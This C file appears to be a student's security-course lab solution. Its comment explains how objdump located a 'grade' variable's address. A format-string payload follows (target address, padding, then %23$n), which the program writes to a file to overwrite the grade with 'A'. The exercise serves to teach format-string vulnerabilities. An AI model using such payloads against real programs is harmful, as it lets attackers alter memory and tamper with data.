// Anubhav Acharya; aa9xu
/*
* The first thing I did was running the objdump command with the -D flag to get
* as much information about the executable as possible. This dump allowed me to
* locate the variable where the grade was stored in the executable. I found this
* out by looking through the main function and saw the address being referenced
* before the printf function was called. I then started crafting the format
* string.
*
* The first item on the string is the address of the grade variable in little
* endian format. This address, which is 4 bytes in length, is then followed by
* 61 spaces. After this, the use of %n specifier would write 64 to the specified
* location. But, the stack was not laid out in the way that only the %n specifier
* would work. The start of the buffer was located 23 stack frames below the
* current stack pointer. This meant that instead of simply %n, %23$n would have
* to be used. Printing this string would use the format string vulnerability to
* exploit the program and change the grade variable to ASCII 64, which is A.
*/

#include <stdio.h>

int main(int argc, char *argv[]) {
	char *buf = "\x2a\xa0\x04\x08                                                             %23$n\nAnubhav Acharya";
	FILE *fp = fopen("gradeA.txt", "wb");
	fprintf(fp, "%s", buf);
	fclose(fp);
	return 0;
}